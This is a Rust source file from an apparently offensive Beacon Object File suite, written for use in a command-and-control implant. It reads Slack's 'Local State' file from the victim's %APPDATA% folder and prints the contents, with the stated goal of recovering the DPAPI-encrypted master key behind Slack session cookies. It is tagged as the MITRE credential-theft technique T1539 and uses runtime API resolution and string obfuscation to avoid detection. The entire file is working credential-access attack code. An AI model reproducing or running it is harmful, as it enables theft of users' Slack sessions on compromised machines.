// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Read Slack's Local State file to find DPAPI-encrypted master key.
//! Args: none
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1539", name: "Steal Web Session Cookie", tactic: "Credential Access" },
];

const CSIDL_APPDATA:    i32 = 0x001A;
const MAX_PATH:        usize = 260;
const GENERIC_READ:     u32  = 0x80000000;
const FILE_SHARE_READ:  u32  = 0x00000001;
const OPEN_EXISTING:    u32  = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE:  usize = !0usize;
const READ_BUF_SIZE:   usize = 4096;

dfr_fn!(
    sh_get_folder_path_a(hwnd: usize, csidl: i32, token: usize, flags: u32, path: *mut u8) -> i32,
    module = "shell32.dll",
    api    = "SHGetFolderPathA"
);
dfr_fn!(
    create_file_a(
        name: *const i8, access: u32, share: u32, sec: *mut u8,
        disp: u32, flags: u32, template: usize,
    ) -> usize,
    module = "kernel32.dll",
    api    = "CreateFileA"
);
dfr_fn!(
    read_file(file: usize, buf: *mut u8, to_read: u32, read: *mut u32, overlapped: *mut u8) -> i32,
    module = "kernel32.dll",
    api    = "ReadFile"
);
dfr_fn!(
    close_handle(h: usize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

fn strlen(buf: &[u8]) -> usize {
    buf.iter().position(|&b| b == 0).unwrap_or(buf.len())
}

#[rustbof::main]
fn main(args: *mut u8, _len: usize) {
    let _ = args;
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let mut appdata = [0u8; MAX_PATH + 1];
    let rc = unsafe {
        sh_get_folder_path_a(0, CSIDL_APPDATA, 0, 0, appdata.as_mut_ptr())
    }.map_err(|_| "path resolve")?;
    if rc != 0 { return Err("get appdata failed"); }

    let base_len = strlen(&appdata);
    // Build full path: %APPDATA%\Slack\Local State
    let suffix = b"\\Slack\\Local State";
    let mut path_buf = [0u8; MAX_PATH + 32];
    if base_len + suffix.len() >= path_buf.len() - 1 { return Err("path too long"); }
    path_buf[..base_len].copy_from_slice(&appdata[..base_len]);
    path_buf[base_len..base_len + suffix.len()].copy_from_slice(suffix);

    let h = unsafe {
        create_file_a(
            path_buf.as_ptr() as *const i8,
            GENERIC_READ, FILE_SHARE_READ, core::ptr::null_mut(),
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0,
        )
    }.map_err(|_| "open file resolve")?;

    if h == 0 || h == INVALID_HANDLE {
        return Err("Local State file not found");
    }

    let mut read_buf = [0u8; READ_BUF_SIZE];
    let mut bytes_read: u32 = 0;
    let rc2 = unsafe {
        read_file(h, read_buf.as_mut_ptr(), READ_BUF_SIZE as u32, &mut bytes_read, core::ptr::null_mut())
    }.map_err(|_| "read resolve")?;
    unsafe { let _ = close_handle(h); };

    if rc2 == 0 || bytes_read == 0 { return Err("read failed"); }

    let content = core::str::from_utf8(&read_buf[..bytes_read as usize]).unwrap_or("[non-utf8]");
    obf! { let hdr = "Slack Local State (first 4096 bytes)"; }
    println!("[*] {}:", hdr);
    println!("{}", content);
    Ok(())
}
